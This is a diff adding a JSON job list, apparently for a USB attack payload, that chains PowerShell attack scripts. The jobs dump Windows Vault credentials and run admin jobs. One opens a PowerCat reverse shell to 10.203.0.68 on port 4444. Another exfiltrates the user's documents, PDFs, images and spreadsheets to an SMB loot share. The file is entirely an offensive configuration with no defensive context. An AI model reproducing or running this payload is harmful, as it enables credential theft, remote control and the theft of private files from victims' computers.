@@ -1,0 +1,24 @@
+[{
+    "jobName"   :"VaultCredential",
+    "command"   :"Get-VaultCredential | out-string",
+    "runType"   :"thread",
+    "scriptName":"Get-VaultCredential.ps1"
+},
+{
+    "jobName"   :"AdminJobsTP",
+    "command"   :"Invoke-AdminJobs",
+    "runType"   :"thread",
+    "scriptName":"Invoke-AdminJobsTP.ps1"
+},
+{
+    "jobName"   :"PowerCat",
+    "command"   :"Connect-Powercat -Mode TCP -RemoteIP \"10.203.0.68\" -Port 4444 -Execute",
+    "runType"   :"process",
+    "scriptName":"Connect-PowerCat2.ps1"
+},
+{
+    "jobName"   :"SMBExfil",
+    "command"   :"Invoke-SMBExfil \"$env:userprofile\\Documents\" $BB_SMBLOOT @(\"*.docx\",\"*.pdf\",\"*.jpg\",\"*.gif\",\"*.xlsx\")",
+    "runType"   :"thread",
+    "scriptName":"Invoke-SMBExfil.ps1"
+}]
